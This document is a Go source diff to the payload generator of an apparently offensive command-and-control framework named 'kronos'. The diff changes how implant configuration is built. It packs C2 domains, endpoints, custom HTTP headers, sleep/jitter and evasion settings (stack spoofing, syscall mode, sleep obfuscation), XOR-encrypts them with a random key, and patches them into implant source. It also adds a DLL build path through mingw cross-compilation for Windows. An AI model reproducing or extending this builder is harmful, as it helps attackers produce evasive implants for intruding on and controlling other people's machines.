@@ -5,6 +5,8 @@ package payloadgen
 
 
 import (
+	"bytes"
+	"crypto/rand"
 	"encoding/binary"
 	"fmt"
 	"os"
@@ -39,10 +41,15 @@ type Obfuscation struct {
 	StackSpoof bool   `yaml:"stack_spoof"`
 }
 
+type Header struct {
+	Key   string `yaml:"key"`
+	Value string `yaml:"value"`
+}
+
 type Profile struct {
 	Domains     []Domain          `yaml:"domains"`
 	Endpoints   Endpoints         `yaml:"endpoints"`
-	UserAgent   string            `yaml:"user_agent"`
+	Headers     []Header          `yaml:"headers"`
 	Sleep       Sleep             `yaml:"sleep"`
 	Obfuscation Obfuscation       `yaml:"obfuscation"`
 }
@@ -84,14 +91,14 @@ func MultiByteLength(val string) int {
 }
 
 
-func writeU32(buf []byte, offset int, val uint32) {
-	binary.LittleEndian.PutUint32(buf[offset:], val)
+func writeU32(buf *bytes.Buffer, val uint32) {
+	binary.Write(buf, binary.LittleEndian, val)
 }
 
-func writeStringNull(buf []byte, offset int, s string) int {
-	copy(buf[offset:], s)
-	buf[offset+len(s)] = 0
-	return len(s) + 1
+func writeString(buf *bytes.Buffer, s string) {
+	writeU32(buf, uint32(len(s)+1))
+	buf.WriteString(s)
+	buf.WriteByte(0)
 }
 
 func syscallTypeToInt(s string) uint32 {
@@ -112,58 +119,55 @@ func boolToU32(b bool) uint32 {
 	return 0
 }
 
+func buildHeaderString(headers []Header) string {
+	var sb strings.Builder
+	for _, h := range headers {
+		sb.WriteString(h.Key)
+		sb.WriteString(": ")
+		sb.WriteString(h.Value)
+		sb.WriteString("\r\n")
+	}
+	sb.WriteString("\r\n")
+	return sb.String()
+}
+
 func CraftProfileBytes(prof *Profile) ([]byte, error) {
-	size := 4 // domaincount
+	buf := new(bytes.Buffer)
+
+	writeU32(buf, uint32(len(prof.Domains)))
 	for _, d := range prof.Domains {
-		size += 4 + len(d.Host) + 1 + 4 + 4
-	}
-	size += 4 + len(prof.Endpoints.Get) + 1   
-	size += 4 + len(prof.Endpoints.Post) + 1   
-	size += 4 + len(prof.UserAgent) + 1         
-	size += 4 * 5                               
-
-	buf := make([]byte, size)
-	off := 0
-
-	writeU32(buf, off, uint32(len(prof.Domains)))
-	off += 4
-
-	for _, d := range prof.Domains {
-		strLen := uint32(len(d.Host) + 1)
-		writeU32(buf, off, strLen)
-		off += 4
-		off += writeStringNull(buf, off, d.Host)
-		writeU32(buf, off, uint32(d.Port))
-		off += 4
-		writeU32(buf, off, boolToU32(d.HTTPS))
-		off += 4
+		writeString(buf, d.Host)
+		writeU32(buf, uint32(d.Port))
+		writeU32(buf, boolToU32(d.HTTPS))
 	}
 
-	writeU32(buf, off, uint32(len(prof.Endpoints.Get)+1))
-	off += 4
-	off += writeStringNull(buf, off, prof.Endpoints.Get)
+	writeString(buf, prof.Endpoints.Get)
+	writeString(buf, prof.Endpoints.Post)
 
-	writeU32(buf, off, uint32(len(prof.Endpoints.Post)+1))
-	off += 4
-	off += writeStringNull(buf, off, prof.Endpoints.Post)
+	headerStr := buildHeaderString(prof.Headers)
+	writeString(buf, headerStr)
 
-	writeU32(buf, off, uint32(len(prof.UserAgent)+1))
-	off += 4
-	off += writeStringNull(buf, off, prof.UserAgent)
+	writeU32(buf, uint32(prof.Sleep.Interval))
+	writeU32(buf, uint32(prof.Sleep.Jitter))
 
-	writeU32(buf, off, uint32(prof.Sleep.Interval))
-	off += 4
-	writeU32(buf, off, uint32(prof.Sleep.Jitter))
-	off += 4
+	writeU32(buf, syscallTypeToInt(prof.Obfuscation.Syscall))
+	writeU32(buf, boolToU32(prof.Obfuscation.Heap))
+	writeU32(buf, boolToU32(prof.Obfuscation.SleepObf))
 
-	writeU32(buf, off, syscallTypeToInt(prof.Obfuscation.Syscall))
-	off += 4
-	writeU32(buf, off, boolToU32(prof.Obfuscation.Heap))
-	off += 4
-	writeU32(buf, off, boolToU32(prof.Obfuscation.SleepObf))
-	off += 4
+	profile := buf.Bytes()
 
-	return buf, nil
+	var key [4]byte
+	rand.Read(key[:])
+
+	for i := range profile {
+		profile[i] ^= key[i%4]
+	}
+
+	out := new(bytes.Buffer)
+	out.Write(key[:])
+	out.Write(profile)
+
+	return out.Bytes(), nil
 }
 
 func UpdateConfigSource(prof *Profile, profileData []byte) error {
@@ -181,14 +185,15 @@ func UpdateConfigSource(prof *Profile, profileData []byte) error {
 	domainBufLen := longestDomain(prof.Domains)
 	getLen := MultiByteLength(prof.Endpoints.Get)
 	postLen := MultiByteLength(prof.Endpoints.Post)
-	uaLen := MultiByteLength(prof.UserAgent)
+	headerStr := buildHeaderString(prof.Headers)
+	headersLen := MultiByteLength(headerStr)
 
 	result := string(content)
 	result = strings.Replace(result, "REPLACE_COUNT_MARKER", fmt.Sprintf("%d", domainCount), 1)
 	result = strings.Replace(result, "REPLACE_LEN_MARKER", fmt.Sprintf("%d", domainBufLen), 1)
 	result = strings.Replace(result, "REPLACE_GET_MARKER", fmt.Sprintf("%d", getLen), 1)
 	result = strings.Replace(result, "REPLACE_POST_MARKER", fmt.Sprintf("%d", postLen), 1)
-	result = strings.Replace(result, "REPLACE_UA_MARKER", fmt.Sprintf("%d", uaLen), 1)
+	result = strings.Replace(result, "REPLACE_HEADER_LEN_MARKER", fmt.Sprintf("%d", headersLen), 1)
 
 	profileHex := formatBytesAsHex(profileData)
 	result = strings.Replace(result, `"REPLACE_PROFILE_DATA_MARKER"`, profileHex, 1)
@@ -199,11 +204,11 @@ func UpdateConfigSource(prof *Profile, profileData []byte) error {
 
 func formatBytesAsHex(data []byte) string {
 	var sb strings.Builder
-	sb.WriteString("(PBYTE)\"")
+	sb.WriteByte('"')
 	for _, b := range data {
 		fmt.Fprintf(&sb, "\\x%02x", b)
 	}
-	sb.WriteString("\"")
+	sb.WriteByte('"')
 	return sb.String()
 }
 
@@ -222,7 +227,7 @@ func GenerateProfile() error {
 }
 
 
-func Compile(name string, debug bool) (string, error) {
+func Compile(name, format string, debug bool) (string, error) {
 	home, _ := os.UserHomeDir()
 	srcDir := filepath.Join(home, ".kronos", "payload", "implant")
 	buildDir := filepath.Join(home, ".kronos", "builds")
@@ -231,7 +236,7 @@ func Compile(name string, debug bool) (string, error) {
 		return "", err
 	}
 
-	outPath := filepath.Join(buildDir, name+".exe")
+	outPath := filepath.Join(buildDir, fmt.Sprintf("%s.%s", name, format))
 
 	args := []string{
 		"x86_64-w64-mingw32-c++",
@@ -247,8 +252,14 @@ func Compile(name string, debug bool) (string, error) {
 		"cmds/cmds.cpp",
 		"networkd/network.cpp",
 		"-I", ".",
-		"-lkernel32", "-lmsvcrt",
 		"-static", "-std=c++17",
+	}
+
+	switch format {
+	case "dll":
+		args = append(args, "-shared", "-DBUILD_DLL", "-lkernel32")
+	default:
+		args = append(args, "-DBUILD_EXE", "-lkernel32", "-lmsvcrt")
 	}
 
 	if debug {
@@ -262,7 +273,9 @@ func Compile(name string, debug bool) (string, error) {
 
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return "", fmt.Errorf("compilation failed: %s\n%s", err, string(output))
+		logPath := filepath.Join(srcDir, "error.log")
+		os.WriteFile(logPath, output, 0644)
+		return "", fmt.Errorf("compilation failed, see %s", logPath)
 	}
 
 	return outPath, nil
